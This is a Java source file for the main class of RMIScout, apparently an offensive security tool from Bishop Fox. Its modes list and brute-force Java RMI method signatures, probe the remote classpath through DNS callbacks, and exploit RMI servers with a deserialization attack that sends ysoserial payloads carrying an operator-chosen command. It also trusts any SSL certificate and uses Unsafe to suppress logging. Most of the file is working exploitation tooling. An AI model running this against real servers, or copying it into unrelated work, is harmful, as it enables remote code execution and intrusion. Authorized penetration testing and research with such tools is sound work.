package com.bishopfox.rmiscout;

import com.bishopfox.gadgetprobe.GadgetProbe;
import com.google.common.collect.Lists;
import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.*;
import sun.misc.Unsafe;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.rmi.AccessException;
import java.rmi.RemoteException;
import java.rmi.UnmarshalException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.*;

public class RMIScout {


    public static ArrayList<String> readFileToList(File filename) {
        ArrayList<String> result = new ArrayList<>();
        try (Scanner s = new Scanner(new FileReader(filename))) {
            while (s.hasNext()) {
                result.add(s.nextLine());
            }
        } catch (FileNotFoundException | NullPointerException e) {
            System.err.println("Couldn't read file: " + filename);
            System.exit(1);
        }
        return result;
    }

    public static HashMap<String, ArrayList<String>> readFileToMap(File filename) {
        HashMap<String, ArrayList<String>> result = new HashMap<String, ArrayList<String>>();
        try (Scanner s = new Scanner(new FileReader(filename))) {
            while (s.hasNext()) {
                String line = s.nextLine();
                String type = line.split(" ")[0];

                if (!result.containsKey(type)) {
                    result.put(type, new ArrayList<>());
                }

                result.get(type).add(line);
            }
        } catch (FileNotFoundException | NullPointerException e) {
            System.err.println("Couldn't read file: " + filename);
            System.exit(1);
        }
        return result;
    }

    @SuppressWarnings("unchecked")
    public static void disableAccessWarnings() {
        try {
            // for IllegalAccessLogger
//            Class unsafeClass = Class.forName("sun.misc.Unsafe");
//            Field field = unsafeClass.getDeclaredField("theUnsafe");
//            field.setAccessible(true);
//            Object unsafe = field.get(null);
//
//            Method putObjectVolatile = unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
//            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);
            Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            Unsafe u = (Unsafe) theUnsafe.get(null);
            Class cls = Class.forName("com.sun.corba.se.spi.logging.LogWrapperBase");
            Field logger = cls.getDeclaredField("logger");
            long offset = u.objectFieldOffset(logger);
            u.putObjectVolatile(cls, offset, null);


//            Class loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
//            Field loggerField = loggerClass.getDeclaredField("logger");
//            Long offset = (Long) staticFieldOffset.invoke(unsafe, loggerField);
//            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);

            // for IllegalAccessLogger
//            Class loggerClass = Class.forName("com.sun.corba.se.spi.logging.LogWrapperBase");
//            Field loggerField = loggerClass.getDeclaredField("logger");
//            Long offset = (Long) staticFieldOffset.invoke(unsafe, loggerField);
//            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
            ignored.printStackTrace();
        }
    }

    public static void list(String host, int port) {
        // Prevent noise from CORBA library
        Utilities.toggleSystemErr();

        String[] regNames = null;
        String[] interfaceNames = null;

        Registry registry = null;
        try {
            // Attempt a standard cleartext connection
            registry = LocateRegistry.getRegistry(host, port);
            regNames = registry.list();
        } catch (Exception e) {}


        if (registry == null || regNames == null) {
            try {
                // Fallback to an insecure (all-trust) SSL Connection
                registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
                regNames = registry.list();
            } catch (Exception e) {}
        }

        if (registry != null && regNames != null) {
            interfaceNames = new String[regNames.length];
            for (int i = 0; i < regNames.length; i++) {
                try {
                    registry.lookup(regNames[i]);
                } catch (UnmarshalException e) {
                    if (e.detail instanceof ClassNotFoundException) {
                        interfaceNames[i] = e.detail.getMessage().split(" ")[0];
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        try {
            Properties props = new Properties();
            String iiopUrl = "iiop://" + host + ":" + port;
            props.put(Context.PROVIDER_URL, iiopUrl);
            props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.cosnaming.CNCtxFactory");

            Context ctx = new InitialContext(props);

            regNames = IIOPConnector.list(ctx);
        } catch (NamingException e) {
        } catch (AccessException e) {
        } catch (RemoteException e) {
        }
        Utilities.toggleSystemErr();

        if (regNames == null) {
            System.out.println("Server is offline or does not use RMI, RMI-SSL, or RMI-IIOP");
        } else {
            String regInfo = Arrays.toString(regNames);
            if (interfaceNames != null) {
                regInfo = "[\n";
                for (int i = 0; i < regNames.length; i++) {
                    regInfo += "\tname[" + i + "] = " + regNames[i] + "\n\t\tclass = " + interfaceNames[i] + "\n";
//                    if (i < regNames.length-1) {
//                        regInfo += ",\n";
//                    }
                }
                regInfo += "]";
            }
            System.out.println("[INFO] Registries available on " + host + ":" + port + " = " + regInfo);
        }
    }


    public static void main(String[] args) {
        // Disable reflective access warnings
        disableAccessWarnings();

        ArgumentParser parser = ArgumentParsers.newFor("rmiscout").build().defaultHelp(true).description("Bruteforce and exploit RMI interfaces");

        final String wordlistModeHelp = "Dictionary attack on RMI interfaces using a prototype wordlist";
        final String bruteforceModeHelp = "Bruteforce attack on RMI interfaces";
        final String exploitModeHelp = "Exploit RMI methods using type-mismatch deserialization attack";
        final String probeModeHelp = "Use GadgetProbe to enumerate classes available on the remote classpath";
        final String invokeModeHelp = "Invoke methods using primitives or Strings";
        final String listModeHelp = "List available registry names";

        final String registryHelp = "Specific registry name to query. All names are queried";
        final String hostHelp = "Remote hostname or IP address";
        final String portHelp = "Remote RMI port";
        final String iiopHelp = "Support for Corba-IIOP";
        final String activationServerHelp = "Support for RMI Activation Stubs";
        final String signatureHelp = "String representing remote target method signature";

        Subparsers subparsers = parser.addSubparsers().title("Modes of operation").metavar("MODE").dest("mode");
        Subparser wordlistMode = subparsers.addParser("wordlist").description(wordlistModeHelp).help(wordlistModeHelp);
        Subparser bruteforceMode = subparsers.addParser("bruteforce").description(bruteforceModeHelp).help(bruteforceModeHelp);
        Subparser exploitMode = subparsers.addParser("exploit").description(exploitModeHelp).help(exploitModeHelp);
        Subparser probeMode = subparsers.addParser("probe").description(probeModeHelp).help(probeModeHelp);
        Subparser invokeMode = subparsers.addParser("invoke").description(probeModeHelp).help(invokeModeHelp);
        Subparser listMode = subparsers.addParser("list").description(probeModeHelp).help(listModeHelp);

        MutuallyExclusiveGroup wordlistMutex = wordlistMode.addMutuallyExclusiveGroup();
        wordlistMutex.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help(activationServerHelp);
        wordlistMutex.addArgument("--iiop").setDefault(false).action(Arguments.storeTrue()).help(iiopHelp);

        wordlistMode.addArgument("--allow-unsafe").setDefault(false).action(Arguments.storeTrue()).help("Allow execution of void function guesses.");
        wordlistMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of function prototypes");
        wordlistMode.addArgument("-n", "--registry-name").help(registryHelp);
        wordlistMode.addArgument("host").help(hostHelp);
        wordlistMode.addArgument("port").type(Integer.class).help(portHelp);

        MutuallyExclusiveGroup bruteforceMutex = bruteforceMode.addMutuallyExclusiveGroup();
        bruteforceMutex.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help(activationServerHelp);
        bruteforceMutex.addArgument("--iiop").setDefault(false).action(Arguments.storeTrue()).help(iiopHelp);

        bruteforceMode.addArgument("--allow-unsafe").setDefault(false).action(Arguments.storeTrue()).help("Allow execution of void function guesses.");
        bruteforceMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of candidate method names");
        bruteforceMode.addArgument("-r", "--return-types").required(true).help("Set of candidate return types");
        bruteforceMode.addArgument("-p", "--parameter-types").required(true).help("Set of candidate parameter types");
        bruteforceMode.addArgument("-l", "--parameter-length").required(true).help("Candidate parameter length range expressed as a comma-delimited range EX: 1,4");
        bruteforceMode.addArgument("-n", "--registry-name").help(registryHelp);
        bruteforceMode.addArgument("host").help(hostHelp);
        bruteforceMode.addArgument("port").type(Integer.class).help(portHelp);

        MutuallyExclusiveGroup exploitMutex = exploitMode.addMutuallyExclusiveGroup();
        exploitMutex.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help(activationServerHelp);
        exploitMutex.addArgument("--iiop").setDefault(false).action(Arguments.storeTrue()).help(iiopHelp);

        exploitMode.addArgument("-s", "--signature").required(true).help(signatureHelp);
        exploitMode.addArgument("-p", "--payload").required(true).help("Fully-qualified name of payload implementing ObjectPayload<Object>. EX: ysoserial.payloads.URLDNS");
        exploitMode.addArgument("-c", "--command").required(true).help("Command String corresponding to payload");
        exploitMode.addArgument("-n", "--registry-name").help(registryHelp);
        exploitMode.addArgument("host").help(hostHelp);
        exploitMode.addArgument("port").type(Integer.class).help(portHelp);

        MutuallyExclusiveGroup probeMutex = probeMode.addMutuallyExclusiveGroup();
        probeMutex.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help(activationServerHelp);
        probeMutex.addArgument("--iiop").setDefault(false).action(Arguments.storeTrue()).help(iiopHelp);

        probeMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of function prototypes");
        probeMode.addArgument("-s", "--signature").required(true).help(signatureHelp);
        probeMode.addArgument("-d", "--dns-endpoint").required(true).help("DNS listener domain");
        probeMode.addArgument("-n", "--registry-name").help(registryHelp);
        probeMode.addArgument("host").help(hostHelp);
        probeMode.addArgument("port").type(Integer.class).help(portHelp);

        MutuallyExclusiveGroup invokeMutex = invokeMode.addMutuallyExclusiveGroup();
        invokeMutex.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help(activationServerHelp);
        invokeMutex.addArgument("--iiop").setDefault(false).action(Arguments.storeTrue()).help(iiopHelp);

        invokeMode.addArgument("-s", "--signature").required(true).help(signatureHelp);
        invokeMode.addArgument("-d", "--delimiter").setDefault(",").help("Delimiter for array arguments (default: ',')");
        invokeMode.addArgument("-p", "--params").required(true).type(String.class).action(Arguments.append()).help("Space delimited arguments corresponding to method signature");
        invokeMode.addArgument("-n", "--registry-name").help(registryHelp);
        invokeMode.addArgument("host").help(hostHelp);
        invokeMode.addArgument("port").type(Integer.class).help(portHelp);

        listMode.addArgument("host").help(hostHelp);
        listMode.addArgument("port").type(Integer.class).help(portHelp);
        /** end ArgParse4j **/

        Namespace ns = null;
        List<String> signatures = null;
        Connector rmisearch = null;
        try {
            ns = parser.parseArgs(args);
            if (ns.get("registry_name") == null) {
                if (ns.get("mode") != "list") {
                    System.out.println("[INFO] No registry specified. Attempting operation on all available registries...");
                }
            } else {
                System.out.println("[INFO] Attempting operation on the \"" + ns.get("registry_name") + "\" registry.");
            }


            // Choose mode
            switch(ns.getString("mode")) {
                case "wordlist":
                    //list(ns.get("host"), ns.get("port"));

                    if (ns.get("iiop")) {
                        confirmIIOPExecution();
                    }
                    // Split by types
                    HashMap<String, ArrayList<String>> sigMap = readFileToMap(ns.get("input"));
                    for (Map.Entry<String, ArrayList<String>> entry : sigMap.entrySet()) {
                        process(ns.get("host"), ns.get("port"), ns.get("registry_name"), entry.getValue(), ns.get("allow_unsafe"), ns.get("activation_server"), ns.get("iiop"));
                    }
                    break;
                case "bruteforce":
                    list(ns.get("host"), ns.get("port"));

                    String[] returnTypes = ns.getString("return_types").split(",");
                    if (ns.get("iiop")) {
                        confirmIIOPExecution();
                        System.out.println("[INFO] RMI-IIOP does not use return types for method hashes and are therefore are unknown. Using \"void\" for return types...");
                        returnTypes = new String[]{"void"};
                    }
                    String[] paramTypes = ns.getString("parameter_types").split(",");
                    String[] paramRangeParts = ns.getString("parameter_length").split(",");
                    int[] paramRange = null;
                    try {
                        paramRange = new int[]{Integer.parseInt(paramRangeParts[0]), Integer.parseInt(paramRangeParts[1])};

                        if (paramRange[1] < paramRange[0]) {
                            throw new IllegalArgumentException();
                        }
                    } catch (IllegalArgumentException | ArrayIndexOutOfBoundsException e){
                        System.err.println("Invalid option for '-n': should be expressed as lower,upper");
                        System.exit(1);
                    }

                    // Java Interfaces disallow different return types for otherwise identical prototypes
                    for (int i = 0; i < returnTypes.length; i++) {
                        signatures = generateMethods(ns.get("input"), returnTypes[i], paramRange, paramTypes);
                        process(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, ns.get("allow_unsafe"), ns.get("activation_server"), ns.get("iiop"));
                    }
                    break;
                case "exploit":
                    // Add exploit signature
                    signatures = new ArrayList<>();
                    signatures.add(ns.get("signature"));

                    if (ns.get("iiop")) {
                        rmisearch = new IIOPConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, false);

                    } else {
                        rmisearch = new RMIConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, false, ns.get("activation_server"));

                    }
                    rmisearch.exploit(ns.get("payload"), ns.get("command"));
                    rmisearch.cleanup();
                    break;
                case "probe":
                    // Add probe signature
                    signatures = new ArrayList<>();
                    signatures.add(ns.get("signature"));

                    // Setup GadgetProbe
                    GadgetProbe gp = new GadgetProbe(ns.get("dns_endpoint"));
                    List<String> classnames = readFileToList(ns.get("input"));

                    if (ns.get("iiop")) {
                        rmisearch = new IIOPConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, true);

                    } else {
                        rmisearch = new RMIConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, true, ns.get("activation_server"));

                    }
                    for (String classname : classnames) {

                        rmisearch.execute(new Serializable[] {(Serializable)gp.getObject(classname)}, false);
                    }
                    break;
                case "invoke":
                    Utilities.setDelimiter(ns.get("delimiter"));

                    signatures = new ArrayList<>();
                    signatures.add(ns.get("signature"));
                    if (ns.get("iiop")) {
                        rmisearch = new IIOPConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, true);

                    } else {
                        rmisearch = new RMIConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, true, ns.get("activation_server"));
                    }
                    List<String> arr = ns.getList("params");
                    String[] arr2 = new String[arr.size()];
                    for (int i = 0; i < arr.size(); i++) {
                        arr2[i] = arr.get(i);
                    }

                    rmisearch.invoke(arr2);
                    rmisearch.cleanup();
                    break;
                case "list":
                    list(ns.get("host"), ns.get("port"));
            }
            System.exit(0);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
        }
    }

    private static void confirmIIOPExecution() {
        Scanner input = new Scanner(System.in);
        while(true) {
            System.out.print("Bruteforcing IIOP may execute methods during discovery. This could result in a loss of data on the remote server. Continue [Y/n]? ");
            String response = input.nextLine();
            if (response.toLowerCase().equals("y")) {
                return;
            }
            else if (response.toLowerCase().equals("n")) {
                System.exit(-1);
            }
        }
    }

    private static void process(String host, int port, String registryName, List<String> signatures, boolean allowUnsafe, boolean isActivationServer, boolean isIIOPServer) {
        if (isIIOPServer) {
            IIOPConnector iiopConnector = new IIOPConnector(host, port, registryName, signatures, allowUnsafe);
            iiopConnector.checkIfPresent();
        } else {
            // Perform batches of 1,000 dynamic methods to not exceed codesize limit of Proxy interface
            final int batch_size = 1000;
            for (int i = 0; i < (signatures.size() / batch_size) + 1; i++) {
                int lower = i * batch_size;
                int upper = Integer.min(signatures.size(), (i + 1) * batch_size);
                RMIConnector rmisearch = new RMIConnector(host, port, registryName, signatures.subList(lower, upper), allowUnsafe, isActivationServer);
                rmisearch.checkIfPresent();
                rmisearch.cleanup();
            }
        }
    }

    private static List<String> generateMethods(File file, String returnType, int[] paramRanges, String[] paramTypes) {
        ArrayList<String> signatures = new ArrayList<>();
        List<String> methodList = readFileToList(file);

        // Generate prototype permutations
        System.out.println("Generating Permutations for [" + returnType + "] type...");

        Collection<List<String>> permutations = Lists.newArrayList();
        for (int i = paramRanges[0]; i <= paramRanges[1]; i++) {
            permutations.addAll(Permutations.permute(paramTypes, i));
        }

        System.out.println("Finished generating and querying " + permutations.size() * methodList.size() + " Permutations");


        for (String method : methodList) {
            if(!method.matches("^\\w+$")) {
                System.err.println(Utilities.Colors.RED + "[ERROR] Fatal error: \"" + method + "\" is not a valid method name. See lists/methods.txt for examples." + Utilities.Colors.ENDC);
                System.exit(1);
            }
            for (List<String> l : permutations) {
                StringBuilder sb = new StringBuilder();
                sb.append(returnType);
                sb.append(" ");
                sb.append(method);
                sb.append("(");
                for (int i = 0; i < l.size(); i++) {
                    sb.append(l.get(i));
                    sb.append(" ");
                    sb.append(String.format("a%d", i));
                    if (i < l.size() - 1) {
                        sb.append(", ");
                    }
                }
                sb.append(")");
                signatures.add(sb.toString());
            }
        }
        return signatures;
    }
}